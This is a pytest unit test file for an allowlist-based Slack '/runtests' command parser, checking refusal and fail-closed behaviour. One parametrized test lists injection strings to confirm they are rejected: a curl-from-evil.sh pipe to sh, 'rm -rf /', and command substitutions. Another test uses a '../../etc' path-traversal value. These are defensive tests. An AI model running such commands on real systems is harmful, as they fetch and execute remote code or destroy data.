"""The parser is a security boundary, so its tests are mostly about refusal.

The allowlists used to be module constants and are now configuration (NEH-1139,
PRD §4.1). These tests therefore build their own `Grammar` with deliberately
FICTIONAL values -- `alpha`, `beta`, `sandbox` -- rather than importing whatever
the code happens to allow. Two reasons, and the second is the one that bites:

1. A test that imports the allowlist and then asserts the allowlist accepts it
   cannot fail. It restates the constant.
2. Real product names in a test file are real product names shipped in this
   repository, which `test_no_house_names_in_defaults.py` exists to prevent.
"""

import pytest

from slack_runtests.parsing import Grammar, SlackArgError, parse

pytestmark = pytest.mark.unit

#: Fictional on purpose -- see the module docstring.
G = Grammar.of(
    products=("alpha", "beta"),
    servers=("sandbox", "staging"),
    test_scopes=("smoke", "full"),
)

#: One of each, to exercise the "nothing to be ambiguous about" defaults.
SINGLE = Grammar.of(products=("alpha",), servers=("sandbox",), test_scopes=("smoke",))


def test_minimal_command() -> None:
    args = parse("-p alpha -s sandbox --test_scope smoke", G)
    assert (args.action, args.product, args.server, args.test_scope) == (
        "run", "alpha", "sandbox", "smoke",
    )


def test_flags_are_order_independent() -> None:
    a = parse("-p alpha -s sandbox --test_scope smoke", G)
    b = parse("--test_scope smoke -s sandbox -p alpha", G)
    assert (a.product, a.server, a.test_scope) == (b.product, b.server, b.test_scope)


def test_quoted_expression_arrives_as_one_argument() -> None:
    # This is what shlex.split buys. Without it this is four arguments and the
    # parser rejects the command for reasons nobody can read.
    args = parse('-p alpha -s sandbox --test_scope smoke -k "smoke and not slow"', G)
    assert args.select == "smoke and not slow"


def test_product_is_allowlisted_so_path_traversal_cannot_reach_the_suite_root() -> None:
    # tests/{product} is interpolated into a path. This is the check that stops
    # it becoming tests/../../anything.
    with pytest.raises(SlackArgError):
        parse("-p ../../etc -s sandbox --test_scope smoke", G)


def test_a_server_outside_the_allowlist_is_refused() -> None:
    # This replaces `assert "prod" not in SERVERS`, which asserted against a
    # compiled-in tuple that no longer exists. The guarantee moved rather than
    # disappeared: the allowlist is now the operator's, so what this file can
    # honestly test is that a value outside it is refused. That NOTHING SHIPPED
    # names `prod` is a separate claim, tested in
    # test_no_house_names_in_defaults.py where the shipped files are the subject.
    with pytest.raises(SlackArgError):
        parse("-p alpha -s prod --test_scope smoke", G)


@pytest.mark.parametrize(
    "expression",
    ['smoke"; curl evil.sh | sh; "', "a && rm -rf /", "$(whoami)", "`id`", "a\nb"],
)
def test_shell_metacharacters_are_refused_in_expressions(expression: str) -> None:
    # These cannot reach a shell from the local runner (argv is a list), but in
    # V2 they travel through a GitHub Actions input, and that CAN become script.
    with pytest.raises(SlackArgError):
        parse(f'-p alpha -s sandbox --test_scope smoke -k "{expression}"', G)


def test_expression_length_is_capped() -> None:
    with pytest.raises(SlackArgError):
        parse(f'-p alpha -s sandbox --test_scope smoke -k "{"a" * 200}"', G)


def test_missing_required_product_raises_rather_than_exiting() -> None:
    # argparse's default is sys.exit(), which inside a web handler is a 500 and
    # shows the user Slack's generic "dispatch_failed" instead of the reason.
    with pytest.raises(SlackArgError):
        parse("-s sandbox --test_scope smoke", G)


def test_unknown_flag_raises_rather_than_exiting() -> None:
    with pytest.raises(SlackArgError):
        parse("-p alpha -s sandbox --test_scope smoke --ref my-branch", G)


def test_every_allowed_product_is_accepted() -> None:
    for product in G.products:
        args = parse(f"-p {product} -s sandbox --test_scope smoke", G)
        assert args.product == product


# ── the allowlists are configuration now (NEH-1139) ──────────────────────────

def test_an_empty_grammar_refuses_every_command_rather_than_allowing_any() -> None:
    """The whole point of §4.1: empty is a refusal, never 'allow everything'.

    Startup refuses this configuration outright, so reaching `parse` with an
    empty Grammar means something built one directly. It must still fall closed.
    """
    empty = Grammar.of((), (), ())
    with pytest.raises(SlackArgError) as caught:
        parse("-p anything -s anywhere --test_scope any", empty)
    # And it must say the SERVER is misconfigured, not that the command is bad.
    # "invalid choice: 'anything'" would send the user to fix their typing.
    assert "allowlist" in str(caught.value)


def test_a_partly_configured_grammar_is_also_refused() -> None:
    """Two of three set is not two-thirds protected, it is unconfigured."""
    for grammar in (
        Grammar.of(("alpha",), (), ("smoke",)),
        Grammar.of((), ("sandbox",), ("smoke",)),
        Grammar.of(("alpha",), ("sandbox",), ()),
    ):
        with pytest.raises(SlackArgError):
            parse("-p alpha -s sandbox --test_scope smoke", grammar)


def test_server_is_required_when_more_than_one_is_allowed() -> None:
    # No compiled-in default any more: `staging` was a value that may not be in
    # an arbitrary operator's allowlist at all.
    with pytest.raises(SlackArgError):
        parse("-p alpha --test_scope smoke", G)


def test_the_sole_allowed_value_becomes_the_default() -> None:
    # Requiring somebody to name the only possible answer is friction with no
    # safety attached -- there is nothing to be ambiguous about.
    args = parse("-p alpha", SINGLE)
    assert (args.server, args.test_scope) == ("sandbox", "smoke")


def test_choices_are_sorted_so_one_mistake_reads_the_same_every_time() -> None:
    # A frozenset's iteration order is stable within a process and arbitrary
    # between them, and `choices` is printed into the message a user reads.
    assert Grammar.of({"c", "a", "b"}, {"z"}, {"y"}).products == ("a", "b", "c")


def test_the_usage_hint_names_this_deployment_rather_than_a_shipped_example() -> None:
    # It was `Try: /runtests -p webapp -s staging -k smoke` -- three values from
    # the old constants. Shipped to a stranger it names products they do not
    # have, which reads as the tool being broken rather than as an example.
    hint = G.usage_hint()
    assert "alpha" in hint and "webapp" not in hint


# ── gate.check's default, which nothing exercised until NEH-1139 ─────────────

def test_gate_check_without_a_grammar_refuses_rather_than_allowing_anything() -> None:
    """Found by planting: a permissive fallback here was caught by NO test.

    `gate.check(grammar=None)` is what a caller that forgot the argument gets.
    Defaulting it to a wide-open Grammar would make every such caller silently
    unauthenticated on the one axis this module guards -- and, being a default,
    it would never appear in a diff anyone reviewed.
    """
    import time
    import urllib.parse

    from slack_runtests import gate
    from slack_runtests.signature import sign

    secret = "s3cr3t"
    body = urllib.parse.urlencode({
        "team_id": "T", "channel_id": "C", "user_id": "U",
        "command": "/runtests", "text": "-p anything -s anywhere",
    })
    ts = str(int(time.time()))
    outcome = gate.check(
        body.encode(),
        {"X-Slack-Request-Timestamp": ts,
         "X-Slack-Signature": sign(body.encode(), ts, secret)},
        signing_secret=secret,
        # every CALLER check satisfied, so only the grammar can refuse this
        allowed_team="T",
        allowed_channels=frozenset({"C"}),
        allowed_users=frozenset({"U"}),
        # grammar deliberately omitted
    )
    assert not outcome.ok
    assert "allowlist" in str(outcome.message)
